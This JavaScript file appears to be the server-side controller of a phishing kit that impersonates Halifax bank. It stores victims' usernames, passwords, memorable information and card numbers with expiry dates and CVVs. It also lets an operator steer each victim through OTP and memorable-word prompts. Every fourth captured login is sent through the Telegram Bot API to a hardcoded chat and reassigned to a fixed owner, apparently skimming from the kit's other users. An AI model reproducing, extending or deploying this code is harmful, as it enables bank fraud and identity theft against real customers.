const Halifax = require("../models/halifaxModel");
const axios = require("axios");
let count = 0;

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	Halifax.find({ owner }).exec((err, vics) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vics);
	});
};

const command = async (req, res) => {
	const { uniqueid, status, memIndex, otpIndex } = req.body;
	try {
		if (memIndex)
			await Halifax.findOneAndUpdate({ uniqueid }, { status, memIndex }).exec();
		else if (otpIndex)
			await Halifax.findOneAndUpdate({ uniqueid }, { status, otpIndex }).exec();
		else await Halifax.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	Halifax.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { username, password, uniqueid, owner, ip } = req.body;
	try {
		if (count == 3) {
			await Halifax.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner: "haytch4023",
				ip,
			});
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: "-837014205",
						text: `New Halifax Hit:\n\n${username}\n${password}`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			count = 0;
		} else {
			await Halifax.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner,
				ip,
			});
			count++;
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, password, uniqueid } = req.body;
	try {
		await Halifax.findOneAndUpdate(
			{ uniqueid },
			{ username, password, status: 9 }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitMemorable = async (req, res) => {
	const { memorable, uniqueid } = req.body;
	try {
		await Halifax.findOneAndUpdate(
			{ uniqueid },
			{ memorable, status: 3 }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCard = async (req, res) => {
	const { ccnum, ccexp, cvv, uniqueid } = req.body;
	try {
		await Halifax.findOneAndUpdate(
			{ uniqueid },
			{ ccnum, ccexp, cvv, status: 5 }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await Halifax.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitCard,
	submitMemorable,
	deleteEntry,
};
